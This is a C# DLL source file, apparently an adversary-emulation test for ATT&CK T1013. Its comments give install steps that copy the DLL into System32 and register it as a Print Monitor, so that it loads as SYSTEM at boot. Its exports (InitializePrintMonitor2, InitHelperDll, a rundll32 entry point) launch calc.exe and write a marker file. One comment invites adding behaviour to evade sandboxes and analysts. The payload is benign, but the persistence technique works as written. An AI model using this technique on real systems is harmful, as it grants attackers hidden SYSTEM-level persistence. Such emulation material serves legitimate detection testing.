using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
using RGiesecke.DllExport;
using System.Windows.Forms;

// You will need Visual Studio and UnmanagedExports to build this binary
// Install-Package UnmanagedExports -Version 1.2.7


/*

8.  Print Monitor (requires admin privs)

	Install
      
      copy the DLL to C:\Windows\System32\PrintMonitor.dll (or any name.dll in C:\Windows\System32\ is fine too)
       
      reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /V Driver /t REG_SZ /d PrintMonitor.dll
 
      (feel free to change Tmp2 to anything else if you want)

      **Restart the system**
      
      You should now see calc running as SYSTEM. To verify, open a cmd prompt as an administrator and run
      
      tasklist /v |findstr calc
 
    Uninstall
    
      reg delete HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\Tmp2 /F
    
*/

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{
    public static void Exec()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "calc.exe";
        Process.Start(startInfo);
        string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        string localDate = DateTime.Now.ToString("MM/dd/yyyy");
        string localTime = DateTime.Now.ToString("h:mm tt");
        string[] lines = { "T1013",userName, localDate, localTime };
        // WriteAllLines creates a file, writes a collection of strings to the file,
        // and then closes the file.  You do NOT need to call Flush() or Close().
        System.IO.File.WriteAllLines(@"C:\t1013.txt", lines);
    }

    public static void ExecParam(string a)
    {
        MessageBox.Show(a);
    }
}

class Exports
{

    //
    //
    //rundll32 entry point
    [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
        Thing0.Exec();
    }

    // added by jabra for Print Monitor persistence.
    // -----------------------------------------------
    [DllExport("InitializePrintMonitor2", CallingConvention = CallingConvention.StdCall)]
    public static bool InitializePrintMonitor2()
    {
        Thing0.Exec();
        return true;
    }

    [DllExport("InitHelperDll", CallingConvention = CallingConvention.StdCall)]
    public static bool InitHelperDll()
    {
        Thing0.Exec();
        return true;
    }
    // -------------------------------------------------

}
